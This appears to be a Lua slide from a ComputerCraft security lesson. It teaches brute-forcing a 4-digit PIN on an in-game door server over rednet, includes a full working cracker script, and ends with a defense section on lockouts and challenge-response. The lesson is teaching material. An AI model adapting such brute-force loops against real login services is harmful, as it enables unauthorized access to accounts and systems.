-- Slide 12: Lab - Password Cracker

clear(colors.black)
header("Lab: Password Cracker", colors.white, colors.red)

local y = 3
text(3, y, "OBJECTIVE:", colors.yellow) y=y+1
text(5, y, "Brute-force a password-protected door over rednet.", colors.white) y=y+2

text(3, y, "SCENARIO:", colors.yellow) y=y+1
bullet(y, "A door server listens on protocol 'doorctl'", colors.white)  y=y+1
bullet(y, "It expects  { cmd='unlock', pass=<string> }", colors.white)  y=y+1
bullet(y, "Replies 'ok' on success, 'denied' on failure", colors.white) y=y+1
bullet(y, "Password is a 4-digit numeric PIN: 0000-9999", colors.white) y=y+2

text(3, y, "KEY CONCEPTS:", colors.orange) y=y+1
bullet(y, "rednet.send / rednet.receive with protocol filter", colors.cyan) y=y+1
bullet(y, "Iterating a keyspace (10,000 combinations)", colors.cyan)        y=y+1
bullet(y, "Rate limiting & timing analysis", colors.cyan)                   y=y+2

text(3, y, "SECURITY ANGLE:", colors.red) y=y+1
text(5, y, "Short PINs are trivially brute-forceable.", colors.white)  y=y+1
text(5, y, "A 4-digit PIN = 10k attempts. At ~20/sec = ~8 min.", colors.white) y=y+2

text(3, y, "DEFENSE:", colors.lime) y=y+1
text(5, y, "Use longer passwords, lockout after N failures,", colors.white) y=y+1
text(5, y, "or challenge-response tokens (nonce + HMAC).", colors.white)

media = {{
  type  = "code",
  title = "[ PASSWORD CRACKER ]",
  code  = [[
-- cracker.lua  -  brute-force 4-digit PIN
local SIDE     = "back"
local PROTO    = "doorctl"
local TIMEOUT  = 0.5

rednet.open(SIDE)

-- Discover door server
print("Looking for door server ...")
local server = rednet.lookup(PROTO, "door")
if not server then error("Door server not found") end
print("Found server ID " .. server)

local attempts = 0
for pin = 0, 9999 do
  local guess = string.format("%04d", pin)
  rednet.send(server, {cmd="unlock", pass=guess}, PROTO)

  local id, reply = rednet.receive(PROTO, TIMEOUT)
  attempts = attempts + 1

  if reply == "ok" then
    print()
    print("[+] PASSWORD FOUND: " .. guess)
    print("    Attempts: " .. attempts)
    rednet.close(SIDE)
    return
  end

  -- Progress indicator
  if attempts % 100 == 0 then
    write(".")
  end
end

print()
print("[-] Exhausted keyspace. No match found.")
rednet.close(SIDE)
]]
}}
